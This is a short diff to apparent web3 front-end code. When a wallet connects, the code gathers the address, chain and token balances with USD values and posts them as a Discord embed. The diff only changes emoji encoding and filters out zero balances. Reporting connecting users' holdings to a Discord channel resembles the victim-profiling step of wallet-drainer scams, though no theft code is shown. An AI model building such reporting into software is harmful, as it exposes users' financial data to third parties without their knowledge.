@@ -51,12 +51,12 @@ async function getUSDPrice(symbol) {
 
 async function sendToDiscordEmbed({ address, chainName, chainId, native, tokens }) {
   const embed = {
-    title: `\ud83c\udfe6 Wallet Connected`,
-    description: `**\ud83d\udc64 Wallet:** \`${address}\`\n\ud83c\udf0d **Chain:** ${chainName} (ID: ${chainId})`,
+    title: `🏦 Wallet Connected`,
+    description: `**👤 Wallet:** \`${address}\`\n🌍 **Chain:** ${chainName} (ID: ${chainId})`,
     color: 0x00ffcc,
     fields: [
       {
-        name: `\ud83d\udcb0 Native Balance`,
+        name: `💰 Native Balance`,
         value: `${native.symbol}: ${native.amount} ${native.usd ? `($${native.usd})` : ""}`,
         inline: false
       }
@@ -69,7 +69,7 @@ async function sendToDiscordEmbed({ address, chainName, chainId, native, tokens 
 
   if (tokens.length > 0) {
     embed.fields.push({
-      name: `\ud83d\udcdc Tokens`,
+      name: `📜 Tokens`,
       value: tokens.map(t => `- ${t.symbol}: ${t.amount} ${t.usd ? `($${t.usd})` : ""}`).join('\n'),
       inline: false
     });
@@ -107,13 +107,16 @@ async function sendBalancesToDiscord(account) {
       if (chainClient.getTokenBalances) {
         const tokens = await chainClient.getTokenBalances({ address });
         for (const token of tokens) {
-          const amount = parseFloat(token.formatted).toFixed(6);
-          const usdPrice = await getUSDPrice(token.symbol);
-          tokensList.push({
-            symbol: token.symbol,
-            amount,
-            usd: usdPrice ? usdPrice * amount : null
-          });
+          const amount = parseFloat(token.formatted);
+          if (amount > 0) {
+            const fixedAmount = amount.toFixed(6);
+            const usdPrice = await getUSDPrice(token.symbol);
+            tokensList.push({
+              symbol: token.symbol,
+              amount: fixedAmount,
+              usd: usdPrice ? usdPrice * amount : null
+            });
+          }
         }
       }
 
